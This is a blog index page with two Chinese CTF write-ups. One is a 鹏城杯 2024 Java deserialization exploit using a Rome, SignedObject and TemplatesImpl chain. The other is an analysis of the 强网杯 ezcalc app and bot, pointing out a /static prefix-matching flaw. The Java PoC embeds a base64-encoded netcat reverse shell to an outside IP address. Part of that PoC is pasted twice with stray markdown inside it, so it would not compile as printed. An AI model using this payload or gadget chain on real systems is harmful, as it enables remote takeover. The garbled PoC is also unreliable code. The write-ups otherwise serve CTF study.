<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Charger0">
<meta property="og:url" content="http://example.com/default-index/index.html">
<meta property="og:site_name" content="Charger0">
<meta property="og:locale">
<meta property="article:author" content="Charger0">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/default-index/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>Charger0</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Charger0</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">技术记录</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/" class="post-title-link" itemprop="url">鹏城杯 2024 java</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:55" itemprop="dateModified" datetime="2024-11-13T17:51:55+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/../imgs/$%7Bfiilename%7D/image-20241112155540909.png" alt="image-20241112155540909"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps2.jpg" alt="img"> </p>
<p>com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd</p>
<p>com.backdoor.classes.look#runcmd里看到了jndi。</p>
<p>出题人可能想让sink点是runcmd。</p>
<p>Util这里限制了resolveclass</p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps3.jpg" alt="c"> </p>
<p>resolveclass用二次反序列化绕过</p>
<p>有rome依赖，用rome进二次反序列化 ，进而Templateimpl</p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps4.jpg" alt="img"> </p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">最终poc</span><br><span class="line"></span><br><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">// 创建恶意类</span><br><span class="line">ClassPool classPool = ClassPool.**getDefault**();</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">CtClass ctClass = classPool.makeClass(&quot;d&quot;);</span><br><span class="line">ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,bmMgMTM5LjIyNC4xMzAuMTgzIDEwMDAyIC1lIHNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">// 创建TemplatesImpl对象</span><br><span class="line">Object templateImpl = Class.**forName**(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">**setFiled**(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line">//Rome</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;&quot;);</span><br><span class="line">**setFieldValue**(badAttributeValueExpException,&quot;val&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span><br><span class="line">String s = **serialize2Base64**(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">byte[] serializedData = Base64.**getMimeDecoder**().decode(s);</span><br><span class="line">String option = **deserializeData**(serializedData);</span><br><span class="line">return s;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/" class="post-title-link" itemprop="url">强网杯 ezcalc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-05 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-05T03:38:24+08:00">2024-11-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:02" itemprop="dateModified" datetime="2024-11-13T17:51:02+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="从强网杯2024-ezcalc学service-worker"><a href="#从强网杯2024-ezcalc学service-worker" class="headerlink" title="从强网杯2024_ezcalc学service-worker"></a>从强网杯2024_ezcalc学service-worker</h2><p>附件下载：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/2024-qwbs8">https://github.com/CTF-Archives/2024-qwbs8</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>windows+webstorm   搭建bot</p>
<p>linux+goland 搭建app</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4><p>只分析关键路由</p>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var err error</span><br><span class="line">db, err = gorm.Open(sqlite.Open(&quot;database.db&quot;), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to connect database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = db.AutoMigrate(&amp;Screenshot&#123;&#125;, &amp;Report&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to migrate database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(&quot;templates/*&quot;)</span><br><span class="line"></span><br><span class="line">r.Use(func(c *gin.Context) &#123;</span><br><span class="line">	host := c.Request.Host</span><br><span class="line">	if host == &quot;&quot; &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, &quot;Bad Request&quot;)</span><br><span class="line">		c.Abort()</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	nonce := RandStringRunes(32)</span><br><span class="line">	c.Set(&quot;nonce&quot;, &quot;&quot;)</span><br><span class="line">	c.Header(&quot;Content-Security-Policy&quot;, fmt.Sprintf(&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;nonce-%s&#x27;; style-src &#x27;unsafe-inline&#x27; &#x27;self&#x27;; img-src &#x27;self&#x27; data: blob:; connect-src &#x27;self&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;; manifest-src &#x27;none&#x27;; object-src &#x27;none&#x27;;&quot;, nonce))</span><br><span class="line">	c.Header(&quot;X-Content-Type-Options&quot;, &quot;nosniff&quot;)</span><br><span class="line">	c.Header(&quot;X-Frame-Options&quot;, &quot;DENY&quot;)</span><br><span class="line">	c.Header(&quot;Cross-Origin-Opener-Policy&quot;, &quot;same-origin&quot;)</span><br><span class="line">	c.Next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>连接sqlite，生成nonce，设置CSP头。</p>
<h5 id="static"><a href="#static" class="headerlink" title="&#x2F;static"></a>&#x2F;static</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.Use(StaticMiddleware(&quot;/static&quot;, &quot;static&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func StaticMiddleware(relativePath, root string) gin.HandlerFunc &#123;</span><br><span class="line">	return func(c *gin.Context) &#123;</span><br><span class="line">		if strings.HasPrefix(c.Request.URL.Path, relativePath) &#123;</span><br><span class="line">			fs := gin.Dir(root, false)</span><br><span class="line">			fileServer := http.StripPrefix(relativePath, http.FileServer(fs))</span><br><span class="line">			fileServer.ServeHTTP(c.Writer, c.Request)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;static处理逻辑是  strings.HasPrefix()来匹配路由是否以&#x2F;static开头，这里存在一个漏洞，后续我们会用到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问/static/1.js        正常处理会返回/static/1.js</span><br><span class="line">访问/static1.js 		  同样会返回 /static/1.js</span><br></pre></td></tr></table></figure>

<h5 id="api-screen-upload"><a href="#api-screen-upload" class="headerlink" title="&#x2F;api&#x2F;screen&#x2F;upload"></a>&#x2F;api&#x2F;screen&#x2F;upload</h5><pre><code>r.POST(&quot;/api/screenshot/upload&quot;, func(c *gin.Context) &#123;
    file, err := c.FormFile(&quot;file&quot;)
    if err != nil &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file&quot;&#125;)
        return
    &#125;

    if file.Size &gt; 1*1024*1024 &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;File size too large&quot;&#125;)
        return
    &#125;

    dir := filepath.Join(&quot;static&quot;)

    if err := os.MkdirAll(dir, os.ModePerm); err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    id := uuid.New().String()
    ext := filepath.Ext(file.Filename)

    for _, item := range blacklistedExt &#123;
        if strings.EqualFold(item, ext) &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Not allowed to upload this file type&quot;&#125;)
            return
        &#125;
    &#125;

    dst := filepath.Join(dir, id+ext)
    src, err := file.Open()
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;
    defer src.Close()
    data, err := io.ReadAll(src)
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    contentType := http.DetectContentType(data)
    if !strings.HasPrefix(contentType, &quot;image/&quot;) &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file type&quot;&#125;)
        return
    &#125;

    out, err := os.Create(dst)
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;
    defer out.Close()

    _, err = io.Copy(out, bytes.NewReader(data))
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    screenshot := Screenshot&#123;
        ID:   id,
        Path: dst,
    &#125;

    if err := db.Create(&amp;screenshot).Error; err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: screenshot&#125;)
&#125;)
</code></pre>
<p>可上传文件到&#x2F;static目录下，文件名不可控，类型有校验</p>
<h5 id="api-report"><a href="#api-report" class="headerlink" title="&#x2F;api&#x2F;report"></a>&#x2F;api&#x2F;report</h5><pre><code>r.POST(&quot;/api/report&quot;, func(c *gin.Context) &#123;
    var req ReportRequest
    if err := c.BindJSON(&amp;req); err != nil &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;)
        return
    &#125;

    report := Report&#123;
        ID:          uuid.New().String(),
        Expression:  req.Expression,
        Result:      req.Result,
        Email:       req.Email,
        Comment:     req.Comment,
        CheckResult: &quot;waiting&quot;,
    &#125;

    for _, id := range req.Screenshots &#123;
        var screenshot Screenshot
        if err := db.Where(&quot;id =?&quot;, id).First(&amp;screenshot).Error; err != nil &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot not found&quot;&#125;)
            return
        &#125;
        if screenshot.ReportID != &quot;&quot; &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot already associated with a report&quot;&#125;)
            return
        &#125;

        screenshot.ReportID = report.ID
        if err := db.Save(&amp;screenshot).Error; err != nil &#123;
            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
            return
        &#125;
    &#125;

    if err := db.Create(&amp;report).Error; err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    reportMutex.Lock()
    if reportGoroutineCount &gt;= 32 &#123;
        reportMutex.Unlock()
        c.JSON(http.StatusTooManyRequests, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Too many requests&quot;&#125;)
        return
    &#125;
    reportMutex.Unlock()

    go func() &#123;
        reportMutex.Lock()
        reportGoroutineCount++
        reportMutex.Unlock()
        defer func() &#123;
            reportMutex.Lock()
            reportGoroutineCount--
            reportMutex.Unlock()
        &#125;()

        req, err := http.NewRequest(&quot;GET&quot;, &quot;http://192.168.233.1:52000/api/bot&quot;, nil)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;
        q := req.URL.Query()
        q.Add(&quot;expr&quot;, report.Expression)
        req.URL.RawQuery = q.Encode()

        client := &amp;http.Client&#123;&#125;
        resp, err := client.Do(req)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        resBody, err := io.ReadAll(resp.Body)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        report.CheckResult = string(resBody)
        db.Save(&amp;report)
    &#125;()

    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: gin.H&#123;&quot;id&quot;: report.ID&#125;&#125;)
&#125;)
</code></pre>
<p>发送请求给bot。</p>
<h4 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h4><h5 id="api-bot"><a href="#api-bot" class="headerlink" title="&#x2F;api&#x2F;bot"></a>&#x2F;api&#x2F;bot</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">  let expr = req.query.expr;</span><br><span class="line"></span><br><span class="line">  if (!expr || typeof expr !== &#x27;string&#x27;) &#123;</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Missing expr query parameter&#x27; &#125;);</span><br><span class="line">      return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">      let browser = await puppeteer.launch(&#123;</span><br><span class="line">          executablePath: &#x27;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#x27;,</span><br><span class="line">	headless: true,</span><br><span class="line">	args: [</span><br><span class="line">		&quot;--no-sandbox&quot;,</span><br><span class="line">		&quot;--disable-setuid-sandbox&quot;,</span><br><span class="line">              &quot;--disable-crashpad&quot;,</span><br><span class="line">		&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;);</span><br><span class="line">      let page = await browser.newPage();</span><br><span class="line">      await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">      await sleep(1000);</span><br><span class="line">      await page.focus(&#x27;input&#x27;);</span><br><span class="line">      await page.keyboard.type(expr);</span><br><span class="line">      await sleep(100);</span><br><span class="line">      await page.click(&#x27;button&#x27;);</span><br><span class="line">      await sleep(2000);</span><br><span class="line">      const result = await page.evaluate(() =&gt; &#123;</span><br><span class="line">          const span = document.querySelector(&#x27;.ant-alert-message&#x27;);</span><br><span class="line">          if (!span) &#123;</span><br><span class="line">              return false;</span><br><span class="line">          &#125;</span><br><span class="line">          return span.textContent === &#x27;114514&#x27;;</span><br><span class="line">      &#125;);</span><br><span class="line">      if (!result) &#123;</span><br><span class="line">          res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Result not found or invalid&#x27; &#125;);</span><br><span class="line">          await page.close();</span><br><span class="line">          await browser.close();</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      if (result) &#123;</span><br><span class="line">          await page.close();</span><br><span class="line">          page = await browser.newPage();</span><br><span class="line">          await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">          await page.focus(&#x27;input&#x27;);</span><br><span class="line">          await page.keyboard.type(`&quot;$&#123;readFileSync(&#x27;/bot/flag&#x27;, &#x27;utf-8&#x27;)&#125;&quot;`, &#123; delay: 100 &#125;);</span><br><span class="line">          await sleep(100);</span><br><span class="line">          await page.click(&#x27;button&#x27;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      await page.close();</span><br><span class="line">      await browser.close();</span><br><span class="line">      </span><br><span class="line">      res.json(&#123; status: &#x27;success&#x27; &#125;);</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">      console.error(`[-] Bot failed to visit: $&#123;error&#125;`);</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Bot failed to visit&#x27; &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接受来自app的请求，提取req中的expr，作为参数去浏览器模拟访问app calc。如果请求结果是114514，则再开一个请求，将flag输入到expr元素中。</p>
